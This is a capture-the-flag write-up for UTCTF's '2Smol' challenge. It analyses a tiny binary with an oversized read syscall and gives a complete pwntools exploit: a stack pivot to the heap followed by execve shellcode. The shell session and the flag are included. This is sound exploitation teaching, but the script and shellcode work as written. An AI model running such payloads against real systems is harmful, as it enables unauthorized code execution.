# 2Smol

## Description

I made this binary 2smol.

nc pwn.utctf.live 9998

by `hukc`

## Solution

### Security measures:

```
-> % checksec --file=smol --output=csv
No RELRO,No Canary found,NX disabled,No PIE,No RPATH,No RUNPATH,Symbols,No,0,0,smol
```

### Functions:

```
[0x00401000]> afl
0x00401000    1 13           entry0
0x0040100d    1 22           main
0x00401023    1 33           loc._read
```

#### Disassembled main:

```
[0x00401000]> pdf @ main
            ; CALL XREF from entry0 @ 0x401000
┌ 22: int main (int argc, char **argv, char **envp);
│           ; var int64_t var_8h @ rbp-0x8
│           0x0040100d      55             push rbp
│           0x0040100e      4889e5         mov rbp, rsp
│           0x00401011      4883ec08       sub rsp, 8
│           0x00401015      488d7df8       lea rdi, [var_8h]           ; int64_t arg1
│           0x00401019      e805000000     call loc._read
│           0x0040101e      4889ec         mov rsp, rbp
│           0x00401021      5d             pop rbp
└           0x00401022      c3             ret
```

The `main` function calls `loc._read` and passes a pointer to `$rbp-0x8`, then returns.

#### Disassembled read:

```
[0x00401000]> pdf @ loc._read
            ; CALL XREF from main @ 0x401019
┌ 33: loc._read (int64_t arg1);
│           ; arg int64_t arg1 @ rdi
│           0x00401023      55             push rbp
│           0x00401024      4889e5         mov rbp, rsp
│           0x00401027      4883ec08       sub rsp, 8
│           0x0040102b      4889fe         mov rsi, rdi                ; arg1
│           0x0040102e      bf00000000     mov edi, 0
│           0x00401033      ba00020000     mov edx, 0x200              ; 512
│           0x00401038      b800000000     mov eax, 0
│           0x0040103d      0f05           syscall
│           0x0040103f      4889ec         mov rsp, rbp
│           0x00401042      5d             pop rbp
└           0x00401043      c3             ret
```

The `loc._read` function executes a syscall, `read(0, *buf, 0x200)`, where `*buf` is the pointer to a local variable in main.
As this will read more characters than the buffer size, we can overwrite the stored `$rbp` and `$rsp`, and `0x190` bytes after that.

### Debugging

```
[#0] Id 1, Name: "smol", stopped 0x401011 in main (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401011 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /home/user/Documents/ctf/2smol/smol
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /home/user/Documents/ctf/2smol/smol
0x0000000000402000 0x0000000000403000 0x0000000000000000 rw- [heap]
0x00007ffff7ff9000 0x00007ffff7ffd000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000000000 r-x [vdso]
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
```

For whatever reason, my machine shows the heap and stack as having `rw-` permissions, these should be `rwx` normally, since we know that NX is disabled.
We can therefore write shellcode to the stack or heap.
Since stack addresses are not known at runtime, we will be using the heap for this exploit.

## Exploit

```py
#!/usr/bin/env python3

from pwn import *

#p = process("./smol")
p = remote('pwn.utctf.live', 9998)

shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

main = 0x0040100d
stack = 0x402500



context.terminal = ['tmux', 'splitw', '-h']

#gdb.attach(p, '''
#b*0x40101e
#''')



payload1 = b''
payload1 += b'A' * 0x8 #padding
payload1 += p64(stack) #rbp
payload1 += p64(main + 8) #rip
payload1 += b'B' * (0x200 - 0x8 * 3)

p.send(payload1)



payload2 = b''
payload2 += b'C' * 0x8 #padding
payload2 += b'D' * 0x8 #rbp
payload2 += p64(stack+0x10) #rip
payload2 += shellcode

p.send(payload2)



p.interactive()
```

```
-> % ./exploit.py                     
[+] Opening connection to pwn.utctf.live on port 9998: Done
[*] Switching to interactive mode
$ whoami
srop
$ ls
flag.txt
$ cat flag.txt
utflag{srop_xd}
$  
```

## Flag
`utflag{srop_xd}`

